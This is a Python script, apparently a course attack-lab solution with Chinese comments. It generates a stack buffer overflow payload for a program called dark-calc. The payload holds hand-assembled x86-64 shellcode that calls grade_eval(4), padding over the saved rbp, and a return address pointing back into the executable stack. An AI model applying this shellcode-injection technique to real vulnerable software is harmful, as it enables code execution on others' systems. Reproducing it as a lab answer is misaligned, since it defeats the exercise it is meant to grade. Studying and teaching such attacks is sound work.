#!/usr/bin/env python3
"""Task 5: 栈空间执行 —— 为 attack/dark-calc 生成 payload。

input() 的局部缓冲区 expression[16] 位于课程固定栈（rwx）的
0x721000800fd0，每次运行地址不变。溢出覆盖 input 的返回地址后，
CPU 从栈上取指执行下面 16 字节的第一阶段代码：

    mov edi, 4        ; grade_eval 的整数实参
    push 0x4019b9     ; 预先写入 grade_eval 的返回地址（input 内 mov edi,0; call exit）
    push 0x401a87     ; grade_eval 入口
    ret               ; 转入 grade_eval(4)

两次 push 让 grade_eval 入口的 rsp 为 0x721000800fe8，即 8 mod 16，
满足 x86-64 System V ABI 对函数入口的栈对齐要求；printf 内部使用的
movaps 需要这个对齐。grade_eval 打印完成后返回 0x4019b9，程序以
状态 0 正常退出。
"""
import struct
import sys

BUF = 0x721000800FD0          # input 的 expression[16] 起始地址
GRADE_EVAL = 0x401A87          # grade_eval 入口
EXIT_STUB = 0x4019B9           # input 内 "mov edi,0; call exit@plt"


def p32(value):
    return struct.pack("<I", value)


def p64(value):
    return struct.pack("<Q", value)


stage1 = (
    b"\xbf\x04\x00\x00\x00"      # mov edi, 4
    + b"\x68" + p32(EXIT_STUB)   # push 0x4019b9
    + b"\x68" + p32(GRADE_EVAL)  # push 0x401a87
    + b"\xc3"                    # ret
)

payload = (
    stage1
    + b"R" * 8                   # 16..23 覆盖 input 保存的 rbp，leave 时弹入 rbp 后不再使用
    + p64(BUF)                   # 24..31 覆盖 input 的返回地址，指向栈上的 stage1
)

assert len(payload) == 32

sys.stdout.buffer.write(payload)
